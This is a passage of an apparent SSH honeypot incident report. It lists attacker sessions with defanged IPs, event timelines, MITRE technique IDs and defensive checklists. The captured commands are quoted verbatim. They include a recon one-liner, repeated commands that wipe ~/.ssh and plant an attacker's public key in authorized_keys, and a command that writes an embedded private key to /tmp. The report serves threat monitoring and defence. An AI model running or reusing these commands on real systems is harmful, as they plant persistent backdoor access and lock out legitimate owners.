| **Last Seen** | 2026-09-06 08:37 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:36:34` | `cowrie.session.connect` |
| `2026-09-06 08:36:35` | `cowrie.login.success` |
| `2026-09-06 08:36:36` | `cowrie.login.success` |
| `2026-09-06 08:36:36` | `cowrie.session.params` |
| `2026-09-06 08:36:37` | `cowrie.command.input` |
| `2026-09-06 08:36:37` | `cowrie.command.failed` |
| `2026-09-06 08:36:37` | `cowrie.command.input` |
| `2026-09-06 08:36:37` | `cowrie.command.failed` |
| `2026-09-06 08:36:37` | `cowrie.command.input` |
| `2026-09-06 08:36:37` | `cowrie.command.input` |
| `2026-09-06 08:36:37` | `cowrie.command.failed` |
| `2026-09-06 08:36:37` | `cowrie.command.failed` |
| `2026-09-06 08:37:08` | `cowrie.log.closed` |
| `2026-09-06 08:37:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.185.230[.]208` to AbuseIPDB if not already reported
- [ ] Block `112.185.230[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac474ba3e183

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 08:38 |
| **Last Seen** | 2026-09-06 08:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:38:50` | `cowrie.session.connect` |
| `2026-09-06 08:38:50` | `cowrie.client.version` |
| `2026-09-06 08:38:50` | `cowrie.client.kex` |
| `2026-09-06 08:38:51` | `cowrie.login.success` |
| `2026-09-06 08:38:52` | `cowrie.session.params` |
| `2026-09-06 08:38:52` | `cowrie.command.input` |
| `2026-09-06 08:38:53` | `cowrie.log.closed` |
| `2026-09-06 08:38:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59d457116e13

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 08:41 |
| **Last Seen** | 2026-09-06 08:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:41:33` | `cowrie.session.connect` |
| `2026-09-06 08:41:33` | `cowrie.client.version` |
| `2026-09-06 08:41:33` | `cowrie.client.kex` |
| `2026-09-06 08:41:33` | `cowrie.login.success` |
| `2026-09-06 08:41:34` | `cowrie.session.params` |
| `2026-09-06 08:41:34` | `cowrie.command.input` |
| `2026-09-06 08:41:35` | `cowrie.log.closed` |
| `2026-09-06 08:41:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74bc1a76127c

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 08:44 |
| **Last Seen** | 2026-09-06 08:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:44:28` | `cowrie.session.connect` |
| `2026-09-06 08:44:28` | `cowrie.client.version` |
| `2026-09-06 08:44:28` | `cowrie.client.kex` |
| `2026-09-06 08:44:29` | `cowrie.login.success` |
| `2026-09-06 08:44:30` | `cowrie.session.params` |
| `2026-09-06 08:44:30` | `cowrie.command.input` |
| `2026-09-06 08:44:31` | `cowrie.log.closed` |
| `2026-09-06 08:44:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7facf738880

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 08:46 |
| **Last Seen** | 2026-09-06 08:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:46:47` | `cowrie.session.connect` |
| `2026-09-06 08:46:48` | `cowrie.client.version` |
| `2026-09-06 08:46:48` | `cowrie.client.kex` |
| `2026-09-06 08:46:51` | `cowrie.login.success` |
| `2026-09-06 08:46:53` | `cowrie.session.params` |
| `2026-09-06 08:46:53` | `cowrie.command.input` |
| `2026-09-06 08:46:54` | `cowrie.log.closed` |
| `2026-09-06 08:46:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61d42552a18e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 08:48 |
| **Last Seen** | 2026-09-06 08:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:48:58` | `cowrie.session.connect` |
| `2026-09-06 08:48:58` | `cowrie.client.version` |
| `2026-09-06 08:48:58` | `cowrie.client.kex` |
| `2026-09-06 08:49:01` | `cowrie.login.success` |
| `2026-09-06 08:49:02` | `cowrie.session.params` |
| `2026-09-06 08:49:02` | `cowrie.command.input` |
| `2026-09-06 08:49:03` | `cowrie.log.closed` |
| `2026-09-06 08:49:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dad637da4fc3

| Field | Detail |
|---|---|
| **Source IP** | `103.143.238[.]100` |
| **First Seen** | 2026-09-06 09:15 |
| **Last Seen** | 2026-09-06 09:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 09:15:05` | `cowrie.session.connect` |
| `2026-09-06 09:15:05` | `cowrie.client.version` |
| `2026-09-06 09:15:05` | `cowrie.client.kex` |
| `2026-09-06 09:15:06` | `cowrie.login.success` |
| `2026-09-06 09:15:06` | `cowrie.session.params` |
| `2026-09-06 09:15:06` | `cowrie.command.input` |
| `2026-09-06 09:15:06` | `cowrie.command.failed` |
| `2026-09-06 09:15:07` | `cowrie.log.closed` |
| `2026-09-06 09:15:07` | `cowrie.session.params` |
| `2026-09-06 09:15:07` | `cowrie.command.input` |
| `2026-09-06 09:15:07` | `cowrie.session.file_download` |
| `2026-09-06 09:15:07` | `cowrie.log.closed` |
| `2026-09-06 09:15:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.238[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.143.238[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae7bf57bef34

| Field | Detail |
|---|---|
| **Source IP** | `103.143.238[.]100` |
| **First Seen** | 2026-09-06 09:15 |
| **Last Seen** | 2026-09-06 09:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 09:15:08` | `cowrie.session.connect` |
| `2026-09-06 09:15:08` | `cowrie.client.version` |
| `2026-09-06 09:15:08` | `cowrie.client.kex` |
| `2026-09-06 09:15:08` | `cowrie.login.success` |
| `2026-09-06 09:15:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.238[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.143.238[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29ddfc0defd5

| Field | Detail |
|---|---|
| **Source IP** | `103.143.238[.]100` |
| **First Seen** | 2026-09-06 09:15 |
| **Last Seen** | 2026-09-06 09:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 09:15:08` | `cowrie.session.connect` |
| `2026-09-06 09:15:08` | `cowrie.client.version` |
| `2026-09-06 09:15:08` | `cowrie.client.kex` |
| `2026-09-06 09:15:08` | `cowrie.login.success` |
| `2026-09-06 09:15:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.238[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.143.238[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c32cec7eb33d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-06 09:19 |
| **Last Seen** | 2026-09-06 09:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 09:19:59` | `cowrie.session.connect` |
| `2026-09-06 09:19:59` | `cowrie.client.version` |
| `2026-09-06 09:19:59` | `cowrie.client.kex` |
| `2026-09-06 09:20:00` | `cowrie.login.success` |
| `2026-09-06 09:20:00` | `cowrie.direct-tcpip.request` |
| `2026-09-06 09:20:00` | `cowrie.direct-tcpip.data` |
| `2026-09-06 09:20:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-849653f1d2df

| Field | Detail |
|---|---|
| **Source IP** | `186.103.169[.]12` |
| **First Seen** | 2026-09-06 09:22 |
| **Last Seen** | 2026-09-06 09:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 09:22:58` | `cowrie.session.connect` |
| `2026-09-06 09:22:58` | `cowrie.client.version` |
| `2026-09-06 09:22:58` | `cowrie.client.kex` |
| `2026-09-06 09:22:59` | `cowrie.login.success` |
| `2026-09-06 09:23:00` | `cowrie.session.params` |
| `2026-09-06 09:23:00` | `cowrie.command.input` |
| `2026-09-06 09:23:00` | `cowrie.command.failed` |
| `2026-09-06 09:23:00` | `cowrie.log.closed` |
| `2026-09-06 09:23:01` | `cowrie.session.params` |
| `2026-09-06 09:23:01` | `cowrie.command.input` |
| `2026-09-06 09:23:01` | `cowrie.session.file_download` |
| `2026-09-06 09:23:01` | `cowrie.log.closed` |
| `2026-09-06 09:23:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.103.169[.]12` to AbuseIPDB if not already reported
- [ ] Block `186.103.169[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-760f57ab5e9d

| Field | Detail |
|---|---|
| **Source IP** | `186.103.169[.]12` |
| **First Seen** | 2026-09-06 09:23 |
| **Last Seen** | 2026-09-06 09:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 09:23:01` | `cowrie.session.connect` |
| `2026-09-06 09:23:01` | `cowrie.client.version` |
| `2026-09-06 09:23:01` | `cowrie.client.kex` |
| `2026-09-06 09:23:02` | `cowrie.login.success` |
| `2026-09-06 09:23:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.103.169[.]12` to AbuseIPDB if not already reported
- [ ] Block `186.103.169[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0d60edc8308

| Field | Detail |
|---|---|
| **Source IP** | `186.103.169[.]12` |
| **First Seen** | 2026-09-06 09:23 |
| **Last Seen** | 2026-09-06 09:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 09:23:02` | `cowrie.session.connect` |
| `2026-09-06 09:23:02` | `cowrie.client.version` |
| `2026-09-06 09:23:02` | `cowrie.client.kex` |
| `2026-09-06 09:23:03` | `cowrie.login.success` |
| `2026-09-06 09:23:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.103.169[.]12` to AbuseIPDB if not already reported
- [ ] Block `186.103.169[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-952c25634296

| Field | Detail |
|---|---|
| **Source IP** | `103.49.239[.]153` |
| **First Seen** | 2026-09-06 09:25 |
| **Last Seen** | 2026-09-06 09:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 09:25:22` | `cowrie.session.connect` |
| `2026-09-06 09:25:22` | `cowrie.client.version` |
| `2026-09-06 09:25:23` | `cowrie.client.kex` |
| `2026-09-06 09:25:25` | `cowrie.login.success` |
| `2026-09-06 09:25:26` | `cowrie.session.params` |
| `2026-09-06 09:25:26` | `cowrie.command.input` |
| `2026-09-06 09:25:26` | `cowrie.command.failed` |
| `2026-09-06 09:25:26` | `cowrie.log.closed` |
| `2026-09-06 09:25:27` | `cowrie.session.params` |
| `2026-09-06 09:25:27` | `cowrie.command.input` |
| `2026-09-06 09:25:27` | `cowrie.session.file_download` |
| `2026-09-06 09:25:27` | `cowrie.log.closed` |
| `2026-09-06 09:25:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.49.239[.]153` to AbuseIPDB if not already reported
- [ ] Block `103.49.239[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7034f31579ed

| Field | Detail |
|---|---|
| **Source IP** | `103.49.239[.]153` |
| **First Seen** | 2026-09-06 09:25 |
| **Last Seen** | 2026-09-06 09:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 09:25:28` | `cowrie.session.connect` |
| `2026-09-06 09:25:28` | `cowrie.client.version` |
| `2026-09-06 09:25:28` | `cowrie.client.kex` |
| `2026-09-06 09:25:29` | `cowrie.login.success` |
| `2026-09-06 09:25:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.49.239[.]153` to AbuseIPDB if not already reported
- [ ] Block `103.49.239[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ed01a47d257

| Field | Detail |
|---|---|
| **Source IP** | `103.49.239[.]153` |
| **First Seen** | 2026-09-06 09:25 |
| **Last Seen** | 2026-09-06 09:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 09:25:29` | `cowrie.session.connect` |
| `2026-09-06 09:25:29` | `cowrie.client.version` |
| `2026-09-06 09:25:30` | `cowrie.client.kex` |
| `2026-09-06 09:25:31` | `cowrie.login.success` |
| `2026-09-06 09:25:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.49.239[.]153` to AbuseIPDB if not already reported
- [ ] Block `103.49.239[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e40cb46ad4a5

| Field | Detail |
|---|---|
| **Source IP** | `43.255.104[.]5` |
| **First Seen** | 2026-09-06 09:30 |
| **Last Seen** | 2026-09-06 09:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 09:30:42` | `cowrie.session.connect` |
| `2026-09-06 09:30:42` | `cowrie.client.version` |
| `2026-09-06 09:30:43` | `cowrie.client.kex` |
| `2026-09-06 09:30:43` | `cowrie.login.success` |
| `2026-09-06 09:30:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.255.104[.]5` to AbuseIPDB if not already reported
- [ ] Block `43.255.104[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ec795e9e485

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-09-06 09:30 |
| **Last Seen** | 2026-09-06 09:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca, ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 09:30:44` | `cowrie.session.connect` |
| `2026-09-06 09:30:44` | `cowrie.client.version` |
| `2026-09-06 09:30:44` | `cowrie.client.kex` |
| `2026-09-06 09:30:44` | `cowrie.login.success` |
| `2026-09-06 09:30:46` | `cowrie.session.params` |
| `2026-09-06 09:30:46` | `cowrie.command.input` |
| `2026-09-06 09:30:46` | `cowrie.session.file_download` |
| `2026-09-06 09:30:46` | `cowrie.session.file_download` |
| `2026-09-06 09:30:46` | `cowrie.log.closed` |
| `2026-09-06 09:30:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bc9e3bb2a64

| Field | Detail |
|---|---|
| **Source IP** | `187.52.212[.]235` |
| **First Seen** | 2026-09-06 09:31 |
| **Last Seen** | 2026-09-06 09:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 09:31:46` | `cowrie.session.connect` |
| `2026-09-06 09:31:46` | `cowrie.client.version` |
| `2026-09-06 09:31:46` | `cowrie.client.kex` |
| `2026-09-06 09:31:47` | `cowrie.login.success` |
| `2026-09-06 09:31:47` | `cowrie.session.params` |
| `2026-09-06 09:31:47` | `cowrie.command.input` |
